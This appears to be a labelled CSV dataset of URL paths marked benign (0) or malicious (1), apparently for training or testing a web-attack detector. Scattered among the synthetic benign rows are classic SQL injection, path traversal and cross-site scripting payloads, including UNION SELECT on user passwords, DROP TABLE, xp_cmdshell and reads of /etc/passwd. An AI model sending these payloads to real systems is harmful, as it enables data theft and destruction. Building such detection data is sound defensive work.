/contact?page=2398,0
/about?search=../../../windows/system32/cmd.exe,1
/about?search=<script>alert(document.cookie)</script>,1
/?id=1; DROP TABLE users,1
/api/users?sort=asc22,0
"/UNION SELECT username, password FROM users",1
/products/item?sort=asc676,0
/login?sort=asc305,0
/api/users?user=urmit365,0
/login,0
/about?search=../../../windows/system32/cmd.exe,1
"/UNION SELECT username, password FROM users",1
/checkout?id=1330,0
/index.html?user=urmit890,0
/index.html?search=<script>alert(document.cookie)</script>,1
/../../../windows/system32/cmd.exe,1
/contact?sort=asc684,0
/index.html?sort=asc135,0
/index.html?sort=asc256,0
/api/users?page=2693,0
/checkout?id=1684,0
/contact?user=urmit947,0
/products/item?user=urmit381,0
/contact?sort=asc511,0
/api/users,0
/checkout?page=2760,0
/../../../../etc/passwd,1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?sort=asc754,0
/index.html?category=tech436,0
/dashboard?category=tech905,0
/about?id=196,0
/checkout?user=urmit413,0
/login?user=urmit968,0
/api/users,0
/products/item?id=1360,0
/login,0
/about?sort=asc975,0
/javascript:eval('var a=1'),1
/login?sort=asc712,0
/dashboard?sort=asc296,0
/about,0
/about,0
"/index.html?search=UNION SELECT username, password FROM users",1
/index.html?sort=asc461,0
/dashboard?search=onload=prompt(1),1
/index.html?search=?id=1; DROP TABLE users,1
/dashboard?user=urmit446,0
/index.html,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?category=tech916,0
/about?sort=asc476,0
/products/item?page=2913,0
/checkout?category=tech847,0
/checkout?user=urmit146,0
/dashboard,0
/contact?category=tech831,0
/contact,0
/api/users?sort=asc981,0
/about,0
/products/item,0
/<script>alert(document.cookie)</script>,1
/checkout?sort=asc505,0
/api/users?id=188,0
/dashboard,0
/api/users?sort=asc54,0
/products/item?sort=asc861,0
/../../../../etc/passwd,1
/login?search=admin' --,1
/login?user=urmit958,0
/login?category=tech803,0
/about?category=tech882,0
/contact?category=tech638,0
/api/users,0
/login?page=2861,0
/login?sort=asc483,0
/../../../../etc/passwd,1
/products/item?user=urmit990,0
/index.html?category=tech336,0
/products/item?id=1613,0
/checkout?sort=asc322,0
/contact?search=admin' --,1
/contact?id=1815,0
/products/item?category=tech541,0
/products/item?id=1387,0
/products/item,0
/about?sort=asc188,0
/dashboard?page=2880,0
/checkout?sort=asc89,0
/contact?sort=asc41,0
/products/item?id=1769,0
/index.html?sort=asc704,0
/../../../windows/system32/cmd.exe,1
/dashboard?user=urmit308,0
"/dashboard?search="" OR 1=1 --",1
/products/item?id=1146,0
/about?page=2949,0
/login?page=2201,0
/index.html?user=urmit432,0
/index.html?search=' OR '1'='1,1
/dashboard?sort=asc833,0
/login?id=146,0
/api/users?sort=asc609,0
/index.html,0
/api/users?search=<script>alert(document.cookie)</script>,1
/login?search=../../../../etc/passwd,1
/checkout?page=2797,0
/dashboard?id=1726,0
/login?search=<script>alert(document.cookie)</script>,1
/dashboard?user=urmit67,0
/contact?category=tech188,0
/api/users,0
/contact,0
/index.html?page=2370,0
/login?sort=asc455,0
/login?category=tech723,0
/contact?search=admin' --,1
/admin' --,1
/checkout?category=tech28,0
/login?page=2493,0
/checkout?user=urmit385,0
/login?search=admin' --,1
/dashboard?page=2235,0
"/login?search=UNION SELECT username, password FROM users",1
/checkout?id=1778,0
/index.html?sort=asc101,0
/?id=1; DROP TABLE users,1
/login?category=tech472,0
/dashboard?user=urmit817,0
/login?category=tech284,0
/about?page=2849,0
/about?id=1651,0
/contact?search=' OR '1'='1,1
/products/item?id=1987,0
/about?user=urmit347,0
/contact,0
/api/users?page=2332,0
/api/users?category=tech506,0
/api/users?user=urmit756,0
"/checkout?search=UNION SELECT username, password FROM users",1
/login?page=284,0
/index.html,0
/index.html?page=2760,0
/about?user=urmit467,0
/about?id=1705,0
/dashboard?id=1622,0
/index.html,0
/products/item?id=1530,0
/api/users,0
/login?page=2792,0
/products/item?sort=asc345,0
/products/item?user=urmit786,0
/contact?category=tech444,0
/about?category=tech668,0
/products/item?category=tech156,0
/admin' --,1
/about,0
/contact?search=admin' --,1
/checkout?id=1298,0
/about?id=1714,0
/api/users?user=urmit329,0
/api/users?user=urmit444,0
/about,0
"/"" OR 1=1 --",1
/dashboard?sort=asc431,0
/checkout?page=2239,0
/checkout?id=119,0
/dashboard?sort=asc848,0
/login?page=2997,0
/products/item?category=tech909,0
/products/item,0
/api/users?page=2113,0
/products/item?sort=asc954,0
/about?user=urmit802,0
/checkout?sort=asc925,0
/about?page=255,0
/index.html?id=1217,0
/api/users?page=2226,0
/contact?sort=asc101,0
/login?sort=asc103,0
/checkout?id=1491,0
/dashboard?category=tech819,0
/about?id=13,0
/checkout?sort=asc370,0
/api/users?user=urmit652,0
/index.html,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item?page=2203,0
/contact?user=urmit872,0
/api/users?category=tech505,0
/checkout,0
/login?category=tech139,0
/index.html?page=276,0
/' OR '1'='1,1
/about?id=1315,0
/index.html?id=1512,0
/dashboard?page=2509,0
/products/item?id=146,0
/dashboard?id=1180,0
/dashboard?search=onload=prompt(1),1
/api/users?id=1939,0
/index.html,0
/index.html?sort=asc679,0
/products/item?user=urmit535,0
/../../../windows/system32/cmd.exe,1
/dashboard?user=urmit612,0
/login?sort=asc969,0
/api/users?sort=asc97,0
/products/item?page=2839,0
/api/users,0
/index.html?category=tech481,0
/api/users?user=urmit320,0
/products/item?sort=asc916,0
/about?search=../../../../etc/passwd,1
/products/item?category=tech136,0
/login?search=' OR '1'='1,1
/checkout?user=urmit978,0
/api/users?user=urmit73,0
/index.html?user=urmit336,0
/checkout?search=<script>alert(document.cookie)</script>,1
/contact?category=tech542,0
/products/item?user=urmit91,0
/api/users?category=tech57,0
/api/users?user=urmit103,0
/products/item?user=urmit147,0
/index.html?search='; EXEC xp_cmdshell('dir');--,1
/login?user=urmit578,0
/about?id=1966,0
/login?category=tech755,0
/products/item?user=urmit357,0
/login?search=../../../windows/system32/cmd.exe,1
/contact?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?category=tech743,0
/products/item?sort=asc17,0
/login?category=tech561,0
/products/item?search=javascript:eval('var a=1'),1
/checkout?search=?id=1; DROP TABLE users,1
/about?category=tech643,0
/products/item?user=urmit822,0
/about?category=tech742,0
/login?id=1206,0
/api/users?sort=asc970,0
/about?page=2894,0
/' OR '1'='1,1
/checkout,0
/products/item?user=urmit635,0
/login?id=1636,0
/dashboard?id=1157,0
/api/users?page=2626,0
/contact?search=admin' --,1
/about?search=onload=prompt(1),1
/login?page=2707,0
/contact?sort=asc530,0
/about?user=urmit36,0
/products/item?user=urmit849,0
/contact?user=urmit907,0
/checkout?search='; EXEC xp_cmdshell('dir');--,1
/login?sort=asc501,0
/contact,0
/products/item?page=298,0
/login?user=urmit153,0
/login,0
/api/users?page=2807,0
/contact?id=1670,0
/api/users?category=tech337,0
/about?sort=asc315,0
/checkout?category=tech400,0
/login?id=1116,0
/login?category=tech898,0
/about?id=1709,0
/login?sort=asc208,0
/checkout?id=1386,0
/login?page=2368,0
/contact?sort=asc598,0
/api/users?sort=asc119,0
/products/item?id=1962,0
/api/users?user=urmit196,0
/admin' --,1
/login?search=onload=prompt(1),1
/' OR '1'='1,1
/about?sort=asc425,0
/api/users?sort=asc100,0
/api/users?id=1343,0
/products/item?search=onload=prompt(1),1
/about?user=urmit343,0
/login?category=tech521,0
/index.html?sort=asc354,0
/checkout?page=2300,0
/api/users,0
"/"" OR 1=1 --",1
/dashboard?id=194,0
/contact,0
/contact?user=urmit661,0
/checkout?user=urmit780,0
/contact?id=1992,0
/checkout,0
/about?id=1113,0
/products/item?user=urmit973,0
/login?search=../../../windows/system32/cmd.exe,1
/../../../../etc/passwd,1
/contact,0
/dashboard,0
/about?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?page=2553,0
/index.html,0
/about?category=tech764,0
/api/users?id=130,0
/?id=1; DROP TABLE users,1
/about,0
/contact?id=1835,0
/api/users?sort=asc918,0
/products/item?id=1493,0
/index.html?page=2611,0
/api/users,0
/products/item?search=../../../../etc/passwd,1
/login?user=urmit905,0
/contact?id=1585,0
/dashboard?page=2228,0
/products/item?sort=asc381,0
/contact?page=2214,0
/index.html?page=2905,0
/products/item?sort=asc946,0
/login?page=2425,0
/checkout?sort=asc305,0
/contact?page=2412,0
/contact,0
/dashboard?id=1657,0
/checkout?search=?id=1; DROP TABLE users,1
/dashboard?id=1146,0
/about?sort=asc242,0
/dashboard?user=urmit635,0
/login?page=2624,0
/index.html?sort=asc341,0
/dashboard?id=1276,0
/api/users?search=' OR '1'='1,1
/products/item?category=tech306,0
/login?search=' OR '1'='1,1
/api/users?page=294,0
/about?category=tech864,0
/login?user=urmit438,0
/contact?user=urmit638,0
/about,0
/index.html,0
/api/users?page=2991,0
/api/users?page=2448,0
/index.html?category=tech732,0
/contact?user=urmit345,0
/login?category=tech509,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?user=urmit205,0
/api/users?user=urmit985,0
/about?sort=asc344,0
/checkout?sort=asc114,0
/contact?page=2843,0
/dashboard?category=tech371,0
/products/item?category=tech366,0
/api/users,0
/about?user=urmit470,0
/contact?sort=asc118,0
/about,0
/api/users?sort=asc194,0
/index.html?sort=asc166,0
/about?sort=asc538,0
/api/users?category=tech834,0
/login?sort=asc167,0
/?id=1; DROP TABLE users,1
/<script>alert(document.cookie)</script>,1
/contact?category=tech806,0
/checkout,0
/contact,0
/api/users?search=?id=1; DROP TABLE users,1
/login?category=tech793,0
/index.html?sort=asc538,0
/contact?page=2794,0
/index.html?id=1288,0
/javascript:eval('var a=1'),1
"/products/item?search=UNION SELECT username, password FROM users",1
/admin' --,1
/about?sort=asc385,0
/../../../../etc/passwd,1
/index.html?user=urmit383,0
/dashboard?sort=asc588,0
/products/item?id=1503,0
/contact?user=urmit435,0
/contact?page=2182,0
/dashboard?page=2552,0
/api/users?page=2296,0
/index.html?id=164,0
/login?user=urmit305,0
/api/users?category=tech653,0
/api/users?user=urmit463,0
/dashboard,0
/javascript:eval('var a=1'),1
/javascript:eval('var a=1'),1
/contact?sort=asc863,0
/dashboard?category=tech201,0
/about,0
/api/users?search=../../../../etc/passwd,1
/login?sort=asc451,0
/login,0
/login?id=1663,0
/api/users?user=urmit177,0
/products/item?search=<script>alert(document.cookie)</script>,1
/products/item?search=../../../../etc/passwd,1
/about?category=tech249,0
/dashboard?id=1346,0
/contact?id=1485,0
/about?id=1136,0
/about?user=urmit827,0
/index.html?user=urmit160,0
/products/item?sort=asc953,0
/index.html?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?sort=asc625,0
/about?search=../../../windows/system32/cmd.exe,1
/login?user=urmit931,0
/index.html?id=1614,0
/about?sort=asc334,0
/contact?page=2541,0
/contact?page=253,0
/dashboard,0
/api/users?category=tech871,0
/products/item?page=2169,0
/index.html?id=1869,0
/index.html?sort=asc600,0
/login?id=1342,0
/?id=1; DROP TABLE users,1
/login,0
/checkout?search=javascript:eval('var a=1'),1
/index.html,0
/login?page=2446,0
/products/item?user=urmit452,0
/api/users,0
/index.html?id=1588,0
/about?id=1824,0
/login?sort=asc221,0
/index.html,0
/dashboard?search=admin' --,1
/products/item?user=urmit381,0
/index.html?search=?id=1; DROP TABLE users,1
/products/item?page=2715,0
/login?user=urmit622,0
/login?page=2626,0
/checkout?category=tech408,0
/dashboard?user=urmit292,0
/api/users?id=1703,0
/index.html?search=?id=1; DROP TABLE users,1
/index.html,0
/products/item?category=tech481,0
/api/users?user=urmit488,0
/api/users?page=2748,0
/login?user=urmit894,0
/login,0
/login?id=1812,0
/products/item?user=urmit421,0
/contact?page=2556,0
/?id=1; DROP TABLE users,1
"/about?search=UNION SELECT username, password FROM users",1
/products/item?category=tech81,0
/login?category=tech44,0
/contact?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?category=tech804,0
/index.html?sort=asc593,0
/products/item?category=tech450,0
/dashboard?page=2259,0
/checkout?user=urmit931,0
/checkout?id=1713,0
/dashboard?page=2504,0
/checkout?sort=asc580,0
/login?id=1670,0
/products/item?id=1406,0
/contact,0
/checkout?user=urmit613,0
/products/item,0
/checkout?category=tech495,0
/checkout,0
/contact,0
/products/item,0
